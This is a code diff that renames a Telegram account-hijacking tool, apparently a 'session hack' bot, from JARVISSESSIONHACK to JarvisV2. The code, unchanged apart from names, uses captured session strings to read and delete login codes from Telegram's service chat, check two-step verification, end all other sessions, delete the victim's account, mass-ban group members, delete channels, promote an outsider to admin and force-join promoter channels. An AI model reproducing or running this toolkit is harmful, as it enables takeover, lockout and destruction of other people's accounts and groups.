@@ -4,11 +4,11 @@ from pyrogram import Client , enums
 from telethon import TelegramClient
 from telethon.sessions import StringSession 
 from pyrogram.raw import functions 
-from JARVISSESSIONHACK import (
+from JarvisV2 import (
      API_ID,
      API_HASH )
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
-from JARVISSESSIONHACK.Helpers.data import info
+from JarvisV2.Helpers.data import info
 from pyrogram.types.messages_and_media.message import Str
 from telethon.tl.functions.channels import EditBannedRequest
 from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
@@ -36,13 +36,13 @@ async def users_gc(session):
             await steve.disconnect()
                  
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
+                k = await Ava.invoke(functions.channels.GetAdminedPublicChannels())            
                 for x in k.chats:
                     msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
     except Exception as idk:
@@ -67,13 +67,13 @@ async def user_info(session):
             await steve.disconnect()
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                k = await stark.get_me()
+                k = await Ava.get_me()
                 msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
     except Exception as idk:
         err += str(idk)
@@ -123,16 +123,16 @@ async def banall(session,id):
                     await asyncio.sleep(0.1)
             await steve.disconnect()
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                async for members in stark.get_chat_members(gc_id):  
+                async for members in Ava.get_chat_members(gc_id):  
                     all += 1                
                     try:                                          
-                        await stark.ban_chat_member(gc_id,members.user.id)  
+                        await Ava.ban_chat_member(gc_id,members.user.id)  
                         bann += 1                  
                     except FloodWait as i:
                         await asyncio.sleep(i.value)
@@ -164,17 +164,17 @@ async def get_otp(session):
             await steve.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
                 ok = []
-                async for message in stark.get_chat_history(777000,limit=2):
+                async for message in Ava.get_chat_history(777000,limit=2):
                     i += f"\n{message.text}\n"                                   
                     ok.append(message.id)                 
-                await stark.delete_messages(777000,ok)
+                await Ava.delete_messages(777000,ok)
     except Exception as idk:
         err += str(idk)
                     
@@ -198,13 +198,13 @@ async def join_ch(session,id):
             await steve.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                await stark.join_chat(gc_id)
+                await Ava.join_chat(gc_id)
     except Exception as idk:
         err += str(idk)
                     
@@ -228,13 +228,13 @@ async def leave_ch(session,id):
             await steve.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                await stark.leave_chat(gc_id)
+                await Ava.leave_chat(gc_id)
     except Exception as idk:
         err += str(idk)
                     
@@ -261,14 +261,14 @@ async def del_ch(session,id):
             await steve.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                await stark.invoke(
-                    functions.channels.DeleteChannel(channel= await stark.resolve_peer(gc_id)))
+                await Ava.invoke(
+                    functions.channels.DeleteChannel(channel= await Ava.resolve_peer(gc_id)))
             
     except Exception as idk:
         err += str(idk)
@@ -300,14 +300,14 @@ async def check_2fa(session):
             await steve.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
                # try:
-                yes = await stark.invoke(functions.account.GetPassword())
+                yes = await Ava.invoke(functions.account.GetPassword())
                 if yes.has_password:
                     i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
                 else:
@@ -334,13 +334,13 @@ async def terminate_all(session):
             await steve.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                await stark.invoke(functions.auth.ResetAuthorizations())
+                await Ava.invoke(functions.auth.ResetAuthorizations())
     except Exception as idk:
         err += str(idk)
                     
@@ -364,13 +364,13 @@ async def del_acc(session):
             await steve.disconnect() 
                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)    
-                await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+                await Ava.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
     except Exception as idk:
         err += str(idk)
                     
@@ -413,16 +413,16 @@ async def piromote(session,gc_id,user_id):
                 await steve.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
             await steve.disconnect()                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)
                 try:    
-                    await stark.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
+                    await Ava.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
                 except:
-                    await stark.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
+                    await Ava.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
     except Exception as idk:
         err += str(idk)
                     
@@ -463,14 +463,14 @@ async def demote_all(session,gc_id):
           
             await steve.disconnect()                              
         else:    
-            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            async with Client("Ava",api_id=API_ID,api_hash=API_HASH, session_string=session) as Ava:
                 try:
-                    await stark.join_chat("@Dora_Hub")
-                    await stark.join_chat("@JARVIS_V_SUPPORT")
+                    await Ava.join_chat("@Dora_Hub")
+                    await Ava.join_chat("@JARVIS_V_SUPPORT")
                 except Exception as e:
                     print(e)
-                async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
-                    await stark.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
+                async for m in Ava.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
+                    await Ava.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
     except Exception as idk:
         err += str(idk)
                     
